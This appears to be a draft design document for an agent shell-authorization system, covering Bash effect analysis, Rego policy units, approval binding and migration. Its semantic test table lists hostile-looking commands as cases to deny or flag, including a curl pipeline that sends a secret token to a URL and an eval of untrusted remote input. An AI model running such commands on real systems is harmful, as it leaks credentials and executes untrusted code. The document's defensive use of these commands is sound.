# Diapason shell analysis and policy design

## Front matter

- **Status:** Draft target architecture; no implementation claim.
- **Updated:** 2026-11-03.
- **Audience:** Implementers, security reviewers, and policy authors.
- **Scope:** Bash evidence and common authorization for command, native-tool,
  and Model Context Protocol (MCP) operations.
- **Precedence:** [RFC 0001](../rfcs/rfc-0001-diapason-shell-policy.md)
  defines the proposal and acceptance requirements. Accepted decision records
  will take precedence over this draft.
- **Delivery:** [GIST roadmap](../project/diapason-shell-policy-roadmap.md).

## Contents

- [1. Problem and vocabulary](#1-problem-constraints-and-vocabulary)
- [2. Threat model](#2-threat-model-and-trust-boundaries)
- [3. Architecture](#3-architecture-and-ownership)
- [4. State and graph](#4-shell-state-and-effect-graph-contract)
- [5. Bounded analysis](#5-brush-backed-bounded-analysis)
- [6. Policy contract](#6-regorus-contract-and-decision-algebra)
- [7. Drop-ins and activation](#7-drop-in-authoring-authority-and-activation)
- [8. Approval and enforcement](#8-approvals-caching-and-enforcement-binding)
- [9. Migration](#9-compatibility-and-retirement)
- [10. Verification](#10-verification-and-release-evidence)
- [11. Authoring and operations](#11-authoring-tools-and-operational-behaviour)
- [12. Risks and deferrals](#12-decisions-risks-and-deferred-scope)

## 1. Problem, constraints, and vocabulary

The current system has several definitions of permission, shell complexity, and
reusable approval. A rule may match raw text, tokens, a tool alias, or a
learned prefix. Consolidation must preserve those distinctions as explicit
evidence while replacing independent authorization authorities.

The target separates three jobs: Rust establishes facts, Regorus evaluates Rego
policy, and Rust enforces obligations. The analyser never runs the proposed
program to discover its effects. Policy modules never launch processes, fetch
network data, reserve budget, or issue approvals.

The following definitions are normative for this proposed contract.

| Term              | Meaning                                                                                              |
| ----------------- | ---------------------------------------------------------------------------------------------------- |
| Effect graph      | Versioned intermediate representation of actions, control flow, provenance, and unresolved behaviour |
| Policy unit       | Independently activated or replaced collection of Rego modules and data with one entry point         |
| Generation        | Immutable, validated set of active units, parameters, delegations, and evaluator configuration       |
| Authority         | Powers assigned by the host to a source identity, bounded by delegation                              |
| Finding           | Typed policy contribution; the host attaches unit identity and generation provenance                 |
| Grant             | Permission for specified graph nodes and effects within the issuing authority's delegated scope      |
| Review obligation | Requirement for an authorized human approval bound to specified facts                                |
| Constraint        | Restriction on execution capabilities; multiple restrictions intersect                               |
| Opaque effect     | Behaviour whose possible effects cannot be bounded precisely by the current analysis                 |
| Binding           | Digests and identities tying an authorization to one executable request and enforcement context      |

_Table 1: Terms used by all three companion documents._

Retain existing crate names during delivery. New reusable analysis and policy
logic belongs outside `vtcode-core`. Runtime events extend the authoritative
`vtcode-exec-events::ThreadEvent` contract rather than introducing a parallel
event stream. Integrate configuration with existing safety/tool configuration;
do not add a competing top-level harness subsystem.

## 2. Threat model and trust boundaries

An attacker can influence repository files, command text, tool arguments,
environment-derived values, executable search paths, aliases, functions,
sourced files, tool output, MCP descriptions, and proposed policy drop-ins.
Concurrent processes can change paths and policy files after inspection. The
agent can generate syntactically valid but malicious Rego or Bash.

Protect host and workspace data, credentials, policy integrity, approval
meaning, execution budgets, and audit confidentiality. Trust the installed
runtime, its schema validators and enforcers, administrator-controlled policy
roots, and explicit user installation decisions. Compromise of the host kernel
or an administrator is outside this boundary. Administrator policy authors are
still subject to resource limits and malformed-output checks.

| Boundary                      | Required control                                                                                                          |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| Model/repository to evidence  | Host-owned normalization; untrusted values never set authority, trust, or completeness fields                             |
| Filesystem to shell state     | Explicit state provenance, bounded read-only snapshot access, identity checks, no executing startup files during analysis |
| Drop-in to policy generation  | Trusted installation root, namespace isolation, delegation checks, bounded compilation, atomic activation                 |
| Rego result to authorization  | Strict output validation; host-stamped provenance; fixed reducer                                                          |
| Approval to execution         | Scope, issuer, expiry, revocation, and binding validation                                                                 |
| Authorization to side effect  | Final dispatch guard plus platform confinement; no permissive fallback                                                    |
| MCP request to remote service | Authenticate provider identity and scope requests; do not equate local sandboxing with remote containment                 |

_Table 2: Trust boundaries and their enforcing components._

Workspace trust permits loading a reviewed source; it does not grant that
source administrator authority. File names, package names, Rego metadata, agent
instructions, and tool annotations are not credentials. Protect policy roots,
approval stores, and audit configuration from agent writes even when ordinary
workspace writes are permitted.

## 3. Architecture and ownership

The pipeline below identifies the data handed across each boundary. Every
execution route must terminate at the same authorization service, even when its
evidence producer differs.

| Stage               | Owner and output                                                                                                     | Failure behaviour                                            |
| ------------------- | -------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| Normalize request   | Runtime adapters produce canonical tool/provider identity, original bytes, structured arguments, principal, and mode | Ambiguous identity blocks dispatch                           |
| Capture state       | Snapshot adapter produces a versioned execution-state descriptor and dependency view                                 | Missing facts remain unknown                                 |
| Analyse             | Proposed `vtcode-shell-analysis` produces graph, taints, coverage, and diagnostics                                   | Parse failure or bounds produce explicit incomplete evidence |
| Evaluate            | Proposed `vtcode-policy` evaluates each active unit with Regorus                                                     | Fault, undefined envelope, or invalid result blocks          |
| Reduce              | Policy service joins findings and required capabilities                                                              | Conflicting constraints block                                |
| Approve and reserve | Existing user interface, approval store, and budget enforcer satisfy obligations                                     | Refusal, expiry, or reservation failure blocks               |
| Bind and dispatch   | Existing executors revalidate state and policy, apply confinement, and consume a one-use authorization               | Drift triggers re-evaluation; unavailable containment blocks |
| Record              | Existing event/memory path records redacted decision and execution outcome                                           | Required audit failure blocks before dispatch                |

_Table 3: Request-to-execution pipeline and failure ownership._

`vtcode-shell-analysis` owns Brush adapters, abstract shell state, command
summaries, and provenance. `vtcode-policy` owns the language-neutral input
contract, generation loader, Regorus wrapper, finding validation, and reducer.
The graph contract can live in the latter initially if that creates no Brush
dependency for native-tool adapters; split a small contract crate only if
dependency analysis justifies it. `vtcode-safety` retains platform enforcers
and narrow compatibility matchers. `vtcode-core` supplies orchestration and
user interaction through these interfaces.

The pure evaluation interface consumes request, evidence, immutable policy
generation, and immutable contextual facts. It returns findings, never an
executable capability. Only the stateful authorization service can produce the
one-use dispatch token. This prevents a classifier or cache from becoming a
second authorization path.

## 4. Shell state and effect-graph contract

### 4.1. Execution-state fidelity

A snapshot describes the shell that will execute the request, not the shell
that happens to launch the agent. Include:

- Shell executable identity, dialect/version, invocation flags, login and
  interactive mode, working directory, locale, and umask.
- Variables and attributes: exported/unexported, arrays, readonly, nameref,
  positional parameters, `IFS`, `PATH`, and dynamic/special variables.
- Shell options, `shopt` settings, aliases, parsed function definitions with
  definition-time context, traps, command hash state, and enabled builtins.
- Open-descriptor capabilities, startup/source-file identities, available
  filesystem observations, and provenance/completeness for every field.

Unknown fields are represented explicitly, never silently initialized to a safe
value. Process identifiers, time, randomness, directory enumeration, and
external results can be symbolic even in an otherwise complete snapshot.

V1 automatic authorization uses a controlled non-interactive Bash launch with
startup loading disabled and an explicitly constructed environment. Strip
`BASH_ENV`, `ENV`, exported-function encodings, and option-import variables
unless their effects are represented and deliberately restored. Do not change
the user's requested invocation silently: uncontrolled login/interactive
launches remain a separate opaque profile requiring review and containment.

The existing environment snapshot is insufficient for automatic semantic
permission. Do not run `source`, `declare`, or a login shell inside the
analyser to manufacture a complete snapshot. A persistent shell may publish
state from a trusted runtime protocol, but its traps and startup effects must
already have run within an authorized execution boundary. If the runtime cannot
bind that state to the next request, classify it as incomplete.

Alias expansion follows parse-time behaviour. Function bodies supplied as
already-defined functions retain the alias context of their definition; do not
re-expand them using today's aliases. Newly sourced definitions are parsed at
the source point against the current abstract state. Function text without
reliable definition provenance is insufficient to claim equivalence.

### 4.2. Input envelope

Use a major `schema_version` with rejecting validators at each boundary.
Unknown major versions block. Minor additive fields require negotiated
capabilities; required evidence may not be omitted. Preserve the original
request separately from normalized facts for legacy matching and explanation.

| Field           | Shape and interpretation                                                                                                                                                        |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `request`       | Stable request ID; kind; original source/argv; canonical tool/action/provider identity; argument digest                                                                         |
| `context`       | Principal and delegated-agent ancestry, workspace/trust identity, mode, platform, clock snapshot, budget counters, approval references, and versioned risk/classification facts |
| `shell`         | State identity, dialect, completeness and dependency digest; absent with an explicit non-shell request kind                                                                     |
| `graph.nodes`   | ID-keyed typed actions with source spans, invocation stack, reachability, effects, completeness and reason codes                                                                |
| `graph.edges`   | Named records with source/target IDs and control, call, data-flow, or dependency kind                                                                                           |
| `graph.values`  | ID-keyed abstract values, origins, integrity/confidentiality labels and sink-validation facts                                                                                   |
| `analysis`      | Analyser/model versions, coverage profile, bounds consumed, unresolved reasons and consulted dependencies                                                                       |
| `compatibility` | Source-tagged legacy matcher facts, ordered rule identities, defaults and importer version                                                                                      |
| `enforcement`   | Available confinement capabilities, effective profile identity, remote-service limitations and reservation facts                                                                |

_Table 4: Proposed policy input; all authority-sensitive fields are host-owned._

Source spans use document ID plus half-open UTF-8 byte offsets. Node and value
IDs are deterministic within an analysis result, not identities reusable across
requests. Preserve argv order, empty strings, and the distinction between
executable identity and `argv[0]`. Non-UTF-8 process values need a lossless
byte encoding with an explicit encoding tag; unsupported decoding cannot fall
back to lossy string matching for permission.

### 4.3. Values, effects, and uncertainty

The abstract value domain is `Concrete`, bounded `Alternatives`, `Symbolic`, or
`Unknown`. Values carry origin sets independently of their value domain. Joins
union origins and alternatives; exceeding a bound widens the value to unknown
while preserving taint and the reason for lost precision. A symbolic value
means a known expression or dependency with an unresolved value, not a promise
that policy can solve it.

Integrity origins include user input, repository content, remote output, and
untrusted environment. Confidentiality labels identify protected data classes
and secret references. Shell quoting is expansion metadata. Sink validators
record a named validator, version, sink, and validated facts; only an explicit
trusted declassification rule can remove a confidentiality restriction.

Reachability is `must`, `may`, or `unreachable` relative to the entry state and
normal execution assumptions. `must` does not promise execution despite a
signal or resource failure. Effect completeness is separately `complete`,
`partial`, or `opaque`. Only soundly proven unreachable nodes can be excluded
from authorization. An unresolved target is a reachable opaque node, not an
unreachable one.

Actions include command/function/builtin calls, file reads/writes, descriptor
duplication/closure, pipelines, environment changes, network operations,
process creation, and native/MCP actions. Redirections exist independently of
external calls: `> report.txt` can truncate a file without running a program.
External calls carry executable identity where known, argv value references,
exported environment references, cwd, descriptor effects, conditions, source
span, and invocation stack.

Taint traverses pipes, redirected input, here-documents, command substitutions,
and exported environment as well as argv. Unknown file contents and opaque
external transformations cannot be treated as untainted. The analyser does not
prove that arbitrary binaries preserve confidentiality; containment and
explicit capability restrictions address that residual risk.

## 5. Brush-backed bounded analysis

### 5.1. Safe reuse boundary

Use `brush-parser` for syntax and adapt it into the stable Diapason graph. Reuse
`brush-core` logic only after separating pure value semantics from host
effects. The current upstream process-launch hook is useful for concrete
execution experiments, but it runs after descriptors are prepared and does not
intercept functions or builtins.[^1] It is not the analyser's safety boundary.
A Diapason-owned abstract evaluator must account for every effectful operation
before host access.

The analyser receives read-only snapshot capabilities through a broker. It has
no process-launch, host-write, or network capability. Snapshot reads are
bounded and recorded; they cannot probe protected paths on behalf of the agent.
Restrict reads to authorized regular-file snapshots and metadata; devices,
FIFOs, sockets, and unbounded virtual files are not source inputs. Place
analysis and policy evaluation in restricted workers with supervisor-enforced
time and memory limits, in addition to internal budgets. Cancelling an async
future alone is not a CPU or memory limit. A worker crash or kill becomes an
explicit fault, never partial permission.

### 5.2. Evaluation rules

Parse against the captured dialect and option context. Preserve syntax that
cannot yet be interpreted as opaque nodes. Do not fall back to tokenization and
label the result complete. Evaluate assignments, quoting, parameter expansion,
field splitting, globbing, and command lookup against abstract state. Resolve
functions, builtins, hashed commands, and PATH lookup in shell order; record
every dependency used by that resolution.

Unknown exit status forks control flow for `if`, `&&`, and `||`. Pipelines
respect `pipefail`, negation, and subshell boundaries. `set -e` behaviour is
modelled only for explicitly covered contexts; otherwise termination and
continuation remain possible. Loops and recursion use bounded fixed-point
iteration, joining state at merge points. On widening or exhaustion, retain
known effects and emit a reachable opaque continuation.

Command substitution never launches a command to discover its output. It
produces nested effects plus an abstract output and status. Process
substitution also introduces process/descriptor effects. `eval`, `source`, and
nested `bash -c` can recurse only when input/state dependencies are known and
budget remains. Otherwise emit opaque re-entry, including potential effects of
evaluating the argument itself. Traps and asynchronous jobs must be modelled or
marked incomplete, not ignored.

The initial experimental bounds are 256 KiB of source, 10,000 graph nodes, 64
alternatives per value, call depth 16, and 32 iterations at a loop join. Use a
250 ms analysis deadline, a 100 ms policy deadline, and a 128 MiB worker memory
ceiling as starting feasibility limits. These are proposed tuning values, not
benchmarks or service guarantees. Count parsing, compilation, data loading, and
result serialization within their corresponding worker budgets. Expose
exhaustion reasons and require new evidence for higher limits.

### 5.3. Command-effect models

A model is versioned Rust evidence logic, not a policy that grants execution.
It declares supported executable identities/versions, option grammar,
environment/config dependencies, effects and explicit coverage limits. Policies
select what is permitted. Models may report known dangerous effects even when
the remaining behaviour is opaque.

Do not infer purity from a command name. Git hooks, filesystem monitors,
external diff/text-conversion helpers, pagers, configuration includes, and
aliases affect execution. `find -exec`, `xargs`, `make`, interpreters, and
remote `ssh` execution require nested-command models or opaque effects. Initial
Git models can restrict launch configuration and environment to a documented
envelope; they must not claim arbitrary Git installations are read-only.
Restricting that envelope is an explicit execution plan visible to the user,
not an unannounced rewrite.

### 5.4. Worked semantic cases

| Request and state                                                                | Required evidence                                                                            | Default consequence                                                     |
| -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| Function `deploy` calls an alias expanded at definition time; `REF` is untrusted | Function/alias provenance, parameter flow, resolved git argv, independent helper uncertainty | Quoting preserves the integrity origin; no blanket read-only grant      |
| `if git diff --quiet; then deploy prod; else deploy stage; fi`                   | Unknown status and both reachable deployment branches                                        | Evaluate both sets of effects                                           |
| `printf '%s' "$TOKEN" \| curl --data-binary @- URL`                              | Secret flow through pipeline stdin to possible network egress                                | Secret-egress policy denies even though secret is absent from curl argv |
| `> "$OUT"` with unknown `OUT`                                                    | Possible truncation and unresolved target                                                    | Review plus enforceable path confinement, or deny                       |
| `eval "$REMOTE"`                                                                 | Untrusted code re-entry and opaque continuation                                              | No automatic grant; known denials still apply                           |
| Apparently safe command after PATH or alias mutation                             | Changed dependency digest and resolution                                                     | Cached analysis and approval are invalid                                |

_Table 5: Semantic acceptance cases; the analyser must not execute these
inputs._

## 6. Regorus contract and decision algebra

### 6.1. Evaluation compartments

Use Rego v1 with an audited builtin profile. Disable ambient network, clock,
randomness, environment access, and arbitrary host extensions. Supply a clock
snapshot and other needed facts through `input`. Custom legacy matchers must be
deterministic and bounded. Enable strict builtin error handling and test its
actual behaviour in the pinned backend; reject unsupported builtins at
activation rather than relying on undefined results.[^2]

Evaluate each unit in a separate engine/compiled-policy compartment with only
its modules, private data, and versioned trusted helper library. This prevents
lower-trust modules from redefining a trusted package, injecting additional
rules into it, or creating cross-unit recursive dependencies. Sharing immutable
compiled state is an optimization only after isolation is demonstrated. Shared
facts are host-built input, not writable cross-unit data.

Do not expose secret values to workspace policy code. Provide labelled value
references and approved predicates such as path containment or secret-flow
presence. If a trusted policy needs exact matching, perform that predicate
within its permitted private view. An omitted sensitive value is explicitly
redacted/unknown, never an empty harmless string.

### 6.2. Unit output

Every unit must define `result` for every valid input. It contains
`schema_version` and a collection of findings, including an empty collection
when nothing matches. Undefined output, conflicting complete rules, malformed
findings, unknown node IDs, invalid constraints, or evaluator faults block the
request. The loader validates unit fixtures before activation; runtime
validation remains mandatory because tests cannot cover arbitrary input.

A finding contains a local `rule_id`, `kind`, covered node/effect identifiers,
a bounded reason code, and typed kind-specific fields. Host metadata supplies
unit ID, authority, module digest, generation ID, and source location. Reject
attempts to supply reserved host metadata. Deduplicate and order findings
deterministically before reporting them.

The following illustrative Rego unit contributes a secret-egress denial using
host-derived flow facts. It is a proposed authoring example, not an installed
or executed policy; implementation must validate it against the pinned engine
and its input schema.

```rego
package diapason.units.secret_egress

import rego.v1

result := {"schema_version": 1, "findings": findings}

findings contains {
    "rule_id": "secret-network-egress",
    "kind": "deny",
    "node_ids": [node.id],
    "reason_code": "secret_reaches_network",
} if {
    some node in input.graph.nodes
    node.reachability != "unreachable"
    "network_egress" in node.effects
    node.secret_input_possible
}
```

The array form of `graph.nodes` presented to Rego is a deterministic
serialization of the ID-keyed graph in §4.2. Required booleans such as
`secret_input_possible` are conservatively derived; absence fails input
validation. A separate mandatory uncertainty unit handles opaque effects,
including unknown network capability. This example alone is not a complete
confidentiality policy.

### 6.3. Reduction

The reducer is a small fixed Rust algebra, not an extensible policy language.
Policies determine findings; the reducer verifies authority and combines them.

1. Block on invalid input, missing required unit, evaluator fault, or failed
   output validation. Preserve the distinction between policy deny and fault in
   diagnostics, though neither permits execution.
2. Apply every active denial across reachable nodes. A grant or approval
   cannot cancel a denial.
3. Intersect filesystem/network permission sets, choose tighter resource
   maxima, and union required audit and approval obligations. Compute a
   supported sandbox profile satisfying all constraints; deny if none exists.
4. Require grant coverage for every reachable action/effect. A legacy
   subsystem's allow-default satisfies only that subsystem's obligation.
   Incomplete evidence cannot obtain automatic coverage, even from a broad
   grant. Generate review obligations for missing coverage and uncertainty.
5. Validate approvals for explicitly reviewable obligations. An approved
   opaque request still needs a supported containment profile and cannot evade
   known denials. Non-interactive or approval-disabled mode denies unsatisfied
   review obligations.
6. Return `allow` only after all remaining obligations are satisfied and
   stateful enforcement can issue a bound one-use dispatch token.

No rules or no grants means review, not allow. The empty graph is valid only
for a proven no-effect request; parser failure cannot produce that proof.
Advice is informational and cannot change authorization. No policy can ask the
reducer to silently replace the command text.

Constraint types are closed and versioned: filesystem roots with access modes
and a declared symlink policy, network destinations/protocols/ports, process
capabilities, and numeric resource maxima. The reducer does not attempt to
intersect arbitrary Rego predicates or regex languages. Platform adapters must
implement the selected typed constraints, including network name-resolution
changes where hostname restrictions are offered. If an adapter cannot enforce a
constraint exactly or more restrictively, deny it; an advisory check is not an
implementation of that constraint.

For append-only restrictions, adding a unit cannot enlarge the permitted set.
Authorized grants and supersession are deliberate authority-bearing changes and
are excluded from that monotonicity claim. Within one active generation, all
surviving units contribute; a higher-authority grant does not override a
lower-authority restriction by accident. Remove that restriction only through
the explicit replacement/update mechanism.

## 7. Drop-in authoring, authority, and activation

### 7.1. Sources and delegation

Discover units in explicit administrator paths, the user's configuration
directory, and an opted-in workspace directory, with existing `.vtcode` naming
retained during migration. The proposed layouts are
`<user-config>/policies.d/<unit>/` and
`<workspace>/.vtcode/policies.d/<unit>/`. Session units are host-managed
ephemeral records. Discovery is sorted for reproducibility, never precedence.
Ignore untrusted workspace policy until the user deliberately trusts it.

| Source class            | Default powers                                         | Replacement boundary                                                              |
| ----------------------- | ------------------------------------------------------ | --------------------------------------------------------------------------------- |
| Runtime invariants      | Schema, authority, binding and fail-closed enforcement | Not replaceable by policy                                                         |
| Mandatory administrator | Restrict and delegate within managed installation      | Owner-controlled updates; no lower source replacement                             |
| Built-in defaults       | Product defaults within installation envelope          | Only named defaults explicitly delegated as replaceable                           |
| User                    | Restrict; grant within administrator envelope          | Own units and explicitly delegated defaults                                       |
| Trusted workspace       | Restrict within that workspace                         | Own units within admitted restriction-only scope; no higher authority replacement |
| Session                 | Narrow, expiring user-authorized restrictions/grants   | No implicit persistent replacement power                                          |
| Learned approval data   | Evidence only                                          | Cannot install or replace policy                                                  |

_Table 6: Source defaults; delegation can narrow them further._

Delegations identify issuer, subject, operation (`grant`, `configure`, or
`replace`), target unit/digest or capability scope, workspace scope, expiry,
and revocation epoch. Validate the chain against the host trust store, with
bounded depth and cycle rejection. A unit manifest cannot self-delegate.
Replacing an owner-controlled restriction can intentionally weaken that owner's
policy, but must be shown as such in the activation diff.

### 7.2. Unit format and extension

A unit directory contains `manifest.json`, Rego modules, `data.json`, and
input/expected-result fixtures. The manifest declares schema and input
versions, unit ID, revision, namespace, entry point, file list, dependency
digests, and `add` or `replace` mode. Reject undeclared module/data paths,
duplicate JSON keys, root escapes, symlinks outside the installation root,
duplicate unit IDs, and unsupported format versions.

Modules within one unit can extend partial-set rules normally. Separate units
contribute findings through their own entry points. Reusable libraries are
pinned per unit and cannot import another authority's mutable namespace.
Parameter schemas declare types, ranges, defaults, and who may configure each
field; changing a parameter requires the same authority checks as changing the
affected policy. Do not recursively merge arbitrary JSON across sources.

The following JSON illustrates a replacement request. The digest is a
placeholder, not a real target. Host installation records supply authority and
grants separately; the manifest cannot claim them.

```json
{
  "schema_version": 1,
  "input_version": 1,
  "unit_id": "user.git_publish",
  "revision": "2",
  "namespace": "diapason.units.user_git_publish_v2",
  "entrypoint": "data.diapason.units.user_git_publish_v2.result",
  "modules": ["policy.rego"],
  "data_files": ["data.json"],
  "fixtures": ["tests/push-internal.json"],
  "dependency_digests": {},
  "mode": "replace",
  "replaces": {
    "unit_id": "defaults.git_publish",
    "digest": "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
  }
}
```

Module, data, and fixture paths are relative to the unit root. The complete
schema, including parameter declarations and fixture input/output envelopes, is
a foundational delivery task. This draft example fixes the minimal unit shape
and replacement semantics without claiming an implemented file format.

### 7.3. Replacement resolution

Resolve target units by `(unit_id, digest)`, not filename or unbounded version
range. Verify that the host-recorded owner permits the proposed replacement and
that the issuer has that delegated right. Reject missing targets, stale
digests, self-replacement, cycles, multiple replacements of the same target,
namespace collisions, and undeclared dependencies. No timestamp or directory
sort order resolves an ambiguity.

Construct the active set by removing only authorized targets and activating
their replacements. Dependency and delegation chains remain inspectable even
when a target is inactive. A replacement can itself be replaced only through a
separate exact-target authorization. Renaming a unit is not a way to remove the
original. Ordinary addition leaves the original active.

For a worked case, assume `defaults.git_publish` requires review for all Git
pushes and the user has explicit replacement permission. A user replacement may
grant pushes to a pinned internal remote while retaining review elsewhere. An
independent administrator secret-egress denial stays active. A workspace
drop-in can add review for a protected branch. Neither the new grant nor a
human approval cancels the administrator denial. Without replacement
permission, activation rejects the candidate; it does not silently run both and
pretend replacement succeeded.

### 7.4. Atomic generation lifecycle

Read a coherent candidate into private staging storage. Validate ownership,
path safety, manifests, dependency graph, authority, compiler profile, schemas,
and fixtures. Compile all compartments, calculate canonical digests, and
present an effective-policy diff for authority-bearing updates. Publish the
entire immutable generation through one atomic reference swap. Archive the
manifest/digests and invalidation epoch for explanation and rollback.

Requests pin a generation while analysing. Immediately before dispatch, compare
it with the active generation and revocation epoch; re-evaluate on change.
Serialize generation publication and the final dispatch commitment through the
same host-owned generation barrier. Under that barrier, recheck the
generation/epoch and consume the one-use token; commitment is the linearization
point after which the request counts as running. Do not hold the barrier while
analysing or awaiting human approval. Activation cannot revoke effects of an
already-running process. A mandatory revocation may cancel running work only
through an explicit runtime termination policy, recorded in audit.

A failed candidate never partially activates. On startup with no valid
generation, block protected execution. During an explicit optional update, the
old generation remains usable until replaced or expired. If a required source
becomes invalid, disappears, or announces a revocation, freeze new protected
execution rather than indefinitely using stale policy. Record the failure and
retain the last valid generation for diagnosis. Rollback is an authorized
activation, subject to current mandatory controls and revocations.

V1 uses local source bundles. Open Policy Agent (OPA) module/data/bundle
conventions inform the layout, but Regorus embedding does not automatically
supply OPA's bundle download, signature, or activation services.[^3] Remote
distribution and OPA-compatible signed archive import are deferred. Never
extract untrusted archives into active policy roots.

## 8. Approvals, caching, and enforcement binding

### 8.1. Approval records

An approval records issuer and authentication context, issue/expiry times,
workspace/principal scope, canonical operation predicates, covered review
obligations, policy generation/revocation epoch, analyser/model versions, state
dependencies, and sandbox profile. Use a host-generated opaque ID and
integrity-protected persistence. Workspace files cannot mint approvals.

Offer one-shot approval first. Persistent command-family approval is a separate
explicit user action showing the generalized predicate and excluded effects.
Never derive a broader persistent grant merely from accepting one request.
Learned approval counts can suggest a candidate, but cannot sign it or
discharge a review on their own. Legacy approval-rate policy remains
representable in the compatibility unit for comparison; retiring its implicit
authority is an intentional migration change requiring review.

### 8.2. Dependency-aware caches

Cache parsed syntax by source/dialect/options. Cache analysis by source,
shell-state dependencies, workspace/filesystem observations, and analyser/model
versions. Cache findings by canonical input and policy generation. Include
clock/budget/approval facts when used, or bypass decision caching for them.
Recheck revocations, counters, containment availability, and one-use token
state on every dispatch regardless of cached findings.

Dependencies include aliases, function definitions, PATH and hash lookup,
working directory, relevant variables/options, executable and source-file
identity, command configuration, and filesystem observations. If dependency
tracking is incomplete, bind the full relevant snapshot or disable reuse. For
sensitive values use a keyed digest for local binding; ordinary hashes of
low-entropy secrets leak information. Do not persist raw environments, source
containing secrets, or tainted argv in normal cache entries.

### 8.3. Final dispatch guard

Bind the exact request, graph, state dependencies, executable resolution,
policy generation, approvals, budget reservation, and effective sandbox profile
to a one-use authorization. Atomically reserve mutable resources. Revalidate
dependencies immediately before executing and consume the token once under the
generation barrier in §7.4. Serialize approval revocation and token consumption
in the same transaction, or validate an approval epoch under that barrier.
Retries and changed requests require fresh authorization.

Use descriptor-relative operations and platform facilities where available to
reduce path substitution races. A path string or preflight `realpath` check
alone does not prevent symlink races. For a GNU Bash script, the runtime cannot
generally pin every internal file access or PATH lookup with a single token.
Therefore run it inside confinement that independently bounds those effects;
classify identities that cannot be held stable as uncertain. The token is a
request-binding mechanism, not proof of every future syscall.

Pseudo-terminal (PTY) execution, direct argv, nested tool dispatch, sub-agents,
native file and network tools, and MCP operations all require this guard. A
tool-level allow for the execution tool cannot authorize its shell payload.
Remote MCP effects cannot be contained by sandboxing a local client; require
provider/action policy and declare the residual remote capability. Authorize
stdio server startup separately from individual MCP calls. Unavailable required
network or filesystem enforcement blocks rather than downgrades the profile.

Keep existing additional-permission normalization and conflicting escalation
request checks before dispatch. Requested capabilities are untrusted input;
granted capabilities come from the common policy and supported enforcer.
Executable-backed skills and native library loads require authorization before
initialization, since loading the library can itself execute code.
Metadata-only discovery cannot imply permission to load native code. These
boundaries are documented in the existing
[command security model](../development/COMMAND_SECURITY_MODEL.md).

Full-auto and preapproval modes are policy facts, never bypass branches.
Counters and retry budgets remain stateful Rust services: Rego can set the
allowed limit, but a concurrent reservation must still succeed. Failure after
reservation releases unused resources without retrying the action implicitly.

## 9. Compatibility and retirement

Use RFC 0001 §2 as the mechanism inventory and extend it with a callsite ledger
before implementation. The ledger records each route, legacy order, decision
semantics, importer, test oracle, new unit, and deletion condition. Distinguish
active paths from dormant compatibility code. In this checkout, the old
`UnifiedCommandEvaluator` is reached through the deprecated `CommandTool`
preparation path, marked dead outside tests; its name does not make it the live
global authority. Active read-only option guards in `command_args.rs` also feed
`tool_intent/readonly.rs`.

Preserve raw-text prefix matching, ordered token-prefix matching, exact
regex/glob dialects, compound splitting, no-match defaults, environment rule
sources, and approval scopes as separately tagged compatibility facts. Rust
matchers report matches only. Rego implements first-match or deny-first
selection as required by each legacy family; a global strictest reducer must
not erase a legacy family's internal ordering during differential comparison.

The old dangerous-command detector can ignore parse failure, whereas the strict
read-only classifier rejects it. These differences are migration fixtures, not
behaviours to harmonize silently. An importer rejects malformed new
configuration, and reports legacy invalid patterns that were previously
skipped. Intentional hardening gets a named migration decision and user-facing
diagnostic.

| Mode                    | Authoritative behaviour                                    | Exit condition                                                                           |
| ----------------------- | ---------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| Shadow                  | Old decisions only; new results recorded without execution | Every inventoried fixture classified; no unexplained new allows                          |
| Guarded opt-in          | Old permission and new obligations both required           | Route-specific parity plus approved hardening and enforcement evidence                   |
| Authoritative per route | Common policy service only for migrated route              | No old allow path reachable on that route; rollback remains explicit                     |
| Complete replacement    | All routes migrated; compatibility readers only            | Remove old evaluators, decision caches, parser fallbacks and implicit learning authority |

_Table 7: Migration states and evidence required to advance._

Keep regex/glob compatibility helpers only while old configuration needs their
exact semantics; they are not parallel policy engines. Remove Tree-sitter Bash
safety use when every consumer has moved to Brush evidence. Other unrelated
Tree-sitter dependencies are outside this change. Preserve sandbox launchers,
approval storage, counters, and audit/event infrastructure.

## 10. Verification and release evidence

The implementation must demonstrate the following invariants. These are
design-level proof obligations, not a promise that tests prove all Bash safe.

| Property                            | Evidence strategy                                                                                                                  | Limit                                                        |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| Restriction monotonicity            | Exhaustively enumerate small finding/authority sets; property-test permutations and added restrictions                             | Excludes authorized grants/replacement                       |
| Reducer determinism                 | Permutation, duplication and serialization tests; model constraint intersections and empty intersections                           | Depends on typed constraint semantics                        |
| No effect during analysis           | Instrument deny-all process/write/network capabilities; adversarial expansions and redirections in isolated workers                | Broker/sandbox correctness remains trusted                   |
| Supported-subset over-approximation | Compare generated bounded programs against GNU Bash traces in disposable, confined fixtures; observed effects must be included     | Differential agreement is not full-language soundness        |
| Unknown monotonicity                | Replace concrete facts with unknown, exhaust budgets, widen loops; automatic coverage must not increase                            | Command-model correctness still needs review                 |
| Authority preservation              | Model activation graph and delegation chains; namespace collision, forged provenance, stale target and competing replacement cases | Host trust-store compromise excluded                         |
| Binding and revocation              | Race tests mutate PATH, aliases, files, policy and approvals; tokens replayed or used by another principal fail                    | Arbitrary shell syscalls still rely on confinement           |
| Complete mediation                  | End-to-end route matrix with denied operations at actual dispatch                                                                  | Remote service internal behaviour is opaque                  |
| Secret non-disclosure               | Canary secrets through pipes, substitutions, errors and policy reasons; scan logs/events/UI and persisted artefacts                | Explicit privileged diagnostic export needs separate consent |

_Table 8: Verification obligations and the boundaries of their evidence._

Use pinned Open Policy Agent and Regorus versions to compare the supported
policy corpus, including undefined values, errors, sets, numbers, regex/glob
boundaries, and conflict handling. Reject unsupported language/builtin features
at activation. The upstream conformance report is evidence of a baseline, not a
substitute for Diapason's actual compiled feature set.[^2]

The combinatorial matrix spans request route, shell dialect/profile,
interactive/full-auto/approval-disabled mode, source authority, generation
reload, approval freshness, analysis completeness, and platform enforcement.
